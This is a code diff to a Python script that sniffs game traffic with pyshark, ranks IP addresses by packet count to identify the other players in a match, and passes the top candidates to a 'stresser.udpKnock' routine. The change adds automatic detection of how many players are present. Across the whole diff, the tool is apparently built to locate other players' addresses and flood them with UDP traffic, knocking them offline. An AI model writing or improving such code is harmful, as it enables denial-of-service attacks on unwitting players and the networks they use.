@@ -1,5 +1,6 @@
 import pyshark
-import netCore, config
+import netCore
+import config
 import stresser
 
 
@@ -20,11 +21,15 @@ else:
     PacketRecieved = capture.apply_on_packets
 
 # Get user input for number of players in match.
-try:
-    playersInMatch = int(input("[?] How many players are in the match: "))
-except ValueError:
-    print("[-] Invalid input, defaulting to 8!")
-    playersInMatch = 8
+if config.autoDetectPlayers == False:
+    try:
+        playersInMatch = int(input("[?] How many players are in the match: "))
+    except ValueError:
+        print("[-] Invalid input, defaulting to 8!")
+        playersInMatch = 8
+else:
+    print("[•] Attempting to auto-detect number of players...")
+    playersInMatch = 0
 
 # Check if the user is spectating or in-game.
 try:
@@ -49,12 +54,28 @@ def captureFinished():
     netCore.printPlayers(canidateList)
     stresser.udpKnock(canidateList)
 
+def isPlayer(ip):
+    test = ipList[ip]
+    compVal = (test/config.packetThreshold)*100
+
+    if compVal >= 60:
+        return 1
+    else:
+        return 0
+
+
 # Sorts the IP entity list by times accessed and adds the top canidates to a list.
 def findUsers():
     x = 0
     global finished
+    global playersInMatch
     sortedList = dict(sorted(ipList.items(), key=lambda item: item[1], reverse=True))
     sortedList = list(sortedList.keys())
+
+    if config.autoDetectPlayers:
+        for x in range(0, len(sortedList)):
+            playersInMatch += isPlayer(sortedList[x])
+        
     while x < playersInMatch-1 and x < len(sortedList):
         canidateList.append(sortedList[x])
         x += 1
